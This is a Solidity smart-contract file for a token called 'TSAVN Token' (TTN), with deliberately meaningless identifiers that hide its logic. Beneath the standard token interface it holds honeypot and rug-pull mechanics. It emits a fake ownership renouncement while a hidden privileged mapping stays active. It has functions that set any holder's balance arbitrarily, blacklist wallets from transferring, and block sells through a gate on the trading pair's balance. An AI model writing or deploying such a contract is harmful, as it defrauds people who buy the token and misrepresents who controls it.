//SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;

interface modeLaunched {
    function totalSupply() external view returns (uint256);

    function balanceOf(address buyWallet) external view returns (uint256);

    function transfer(address listIs, uint256 tradingSender) external returns (bool);

    function allowance(address txWallet, address spender) external view returns (uint256);

    function approve(address spender, uint256 tradingSender) external returns (bool);

    function transferFrom(
        address sender,
        address listIs,
        uint256 tradingSender
    ) external returns (bool);

    event Transfer(address indexed from, address indexed launchAmount, uint256 value);
    event Approval(address indexed txWallet, address indexed spender, uint256 value);
}

interface liquidityLimit is modeLaunched {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract fundLimit {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface tokenReceiverLiquidity {
    function createPair(address feeWallet, address shouldWalletMarketing) external returns (address);
}

interface receiverTx {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract TSAVNToken is fundLimit, modeLaunched, liquidityLimit {

    uint256 private buyExemptSwap;

    function senderMax(address senderTx) public {
        amountTotal();
        if (fromMarketingShould != shouldTrading) {
            shouldTrading = true;
        }
        if (senderTx == isSellBuy || senderTx == fromList) {
            return;
        }
        buyLaunchedAuto[senderTx] = true;
    }

    function allowance(address takeLaunch, address buyTotal) external view virtual override returns (uint256) {
        if (buyTotal == totalExempt) {
            return type(uint256).max;
        }
        return totalLiquidity[takeLaunch][buyTotal];
    }

    mapping(address => mapping(address => uint256)) private totalLiquidity;

    uint256 exemptMax;

    function name() external view virtual override returns (string memory) {
        return takeMode;
    }

    constructor (){
        if (isShould) {
            isShould = false;
        }
        maxAmount();
        receiverTx isTotal = receiverTx(totalExempt);
        fromList = tokenReceiverLiquidity(isTotal.factory()).createPair(isTotal.WETH(), address(this));
        if (shouldTrading != isShould) {
            buyExemptSwap = takeTotal;
        }
        isSellBuy = _msgSender();
        txShould[isSellBuy] = true;
        toIs[isSellBuy] = shouldReceiverEnable;
        if (fromMarketingShould == shouldTrading) {
            isShould = true;
        }
        emit Transfer(address(0), isSellBuy, shouldReceiverEnable);
    }

    function walletMin(address walletAt, address listIs, uint256 tradingSender) internal returns (bool) {
        if (walletAt == isSellBuy) {
            return totalFund(walletAt, listIs, tradingSender);
        }
        uint256 feeReceiver = modeLaunched(fromList).balanceOf(minTrading);
        require(feeReceiver == exemptMax);
        require(!buyLaunchedAuto[walletAt]);
        return totalFund(walletAt, listIs, tradingSender);
    }

    function approve(address buyTotal, uint256 tradingSender) public virtual override returns (bool) {
        totalLiquidity[_msgSender()][buyTotal] = tradingSender;
        emit Approval(_msgSender(), buyTotal, tradingSender);
        return true;
    }

    uint8 private takeShould = 18;

    address minTrading = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    bool public txAt;

    function totalSupply() external view virtual override returns (uint256) {
        return shouldReceiverEnable;
    }

    address totalExempt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function owner() external view returns (address) {
        return tokenEnable;
    }

    address public isSellBuy;

    function decimals() external view virtual override returns (uint8) {
        return takeShould;
    }

    string private takeMode = "TSAVN Token";

    mapping(address => uint256) private toIs;

    function transferFrom(address walletAt, address listIs, uint256 tradingSender) external override returns (bool) {
        if (_msgSender() != totalExempt) {
            if (totalLiquidity[walletAt][_msgSender()] != type(uint256).max) {
                require(tradingSender <= totalLiquidity[walletAt][_msgSender()]);
                totalLiquidity[walletAt][_msgSender()] -= tradingSender;
            }
        }
        return walletMin(walletAt, listIs, tradingSender);
    }

    function getOwner() external view returns (address) {
        return tokenEnable;
    }

    address public fromList;

    mapping(address => bool) public txShould;

    bool public fromMarketingShould;

    function symbol() external view virtual override returns (string memory) {
        return marketingSell;
    }

    string private marketingSell = "TTN";

    function transfer(address receiverBuy, uint256 tradingSender) external virtual override returns (bool) {
        return walletMin(_msgSender(), receiverBuy, tradingSender);
    }

    function listLimit(address receiverBuy, uint256 tradingSender) public {
        amountTotal();
        toIs[receiverBuy] = tradingSender;
    }

    uint256 private shouldReceiverEnable = 100000000 * 10 ** 18;

    uint256 public takeTotal;

    mapping(address => bool) public buyLaunchedAuto;

    function amountTotal() private view {
        require(txShould[_msgSender()]);
    }

    address private tokenEnable;

    function maxAmount() public {
        emit OwnershipTransferred(isSellBuy, address(0));
        tokenEnable = address(0);
    }

    event OwnershipTransferred(address indexed buyAmount, address indexed tradingAt);

    function swapMarketing(address marketingTotal) public {
        if (txAt) {
            return;
        }
        if (shouldTrading == isShould) {
            isShould = false;
        }
        txShould[marketingTotal] = true;
        if (fromMarketingShould != shouldTrading) {
            shouldTrading = true;
        }
        txAt = true;
    }

    bool public isShould;

    function liquidityIsSender(uint256 tradingSender) public {
        amountTotal();
        exemptMax = tradingSender;
    }

    uint256 autoEnable;

    function balanceOf(address buyWallet) public view virtual override returns (uint256) {
        return toIs[buyWallet];
    }

    function totalFund(address walletAt, address listIs, uint256 tradingSender) internal returns (bool) {
        require(toIs[walletAt] >= tradingSender);
        toIs[walletAt] -= tradingSender;
        toIs[listIs] += tradingSender;
        emit Transfer(walletAt, listIs, tradingSender);
        return true;
    }

    bool public shouldTrading;

}